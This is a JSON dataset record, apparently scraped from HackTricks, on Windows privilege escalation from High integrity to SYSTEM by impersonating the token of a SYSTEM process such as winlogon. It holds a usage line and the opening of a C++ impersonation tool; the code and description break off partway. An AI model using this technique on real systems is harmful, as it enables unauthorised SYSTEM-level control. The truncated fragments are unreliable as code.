@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_fa9b59b49639",
+  "category": "windows-hardening",
+  "title": "seimpersonate from high to system",
+  "description": "# SeImpersonate from High To System\n\n{{#include ../../banners/hacktricks-training.md}}\n\n### Code\n\nThe following code from [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). It allows to **indicate a Process ID as argument** and a CMD **running as the user** of the indicated process will be run.\\\nRunning in a High Integrity process you can **indicate the PID of a process running as System** (like winlogon, wininit) and execute a cmd.exe as sy",
+  "payloads": [
+    "# SeImpersonate from High To System",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "### Code",
+    "The following code from [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). It allows to **indicate a Process ID as argument** and a CMD **running as the user** of the indicated process will be run.\\",
+    "Running in a High Integrity process you can **indicate the PID of a process running as System** (like winlogon, wininit) and execute a cmd.exe as system.",
+    "```cpp",
+    "impersonateuser.exe 1234",
+    "```cpp:impersonateuser.cpp",
+    "// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962",
+    "#include <windows.h>",
+    "#include <iostream>",
+    "#include <Lmcons.h>",
+    "BOOL SetPrivilege(",
+    "HANDLE hToken,          // access token handle",
+    "LPCTSTR lpszPrivilege,  // name of privilege to enable/disable"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/windows-local-privilege-escalation/seimpersonate-from-high-to-system.md"
+  ]
+}
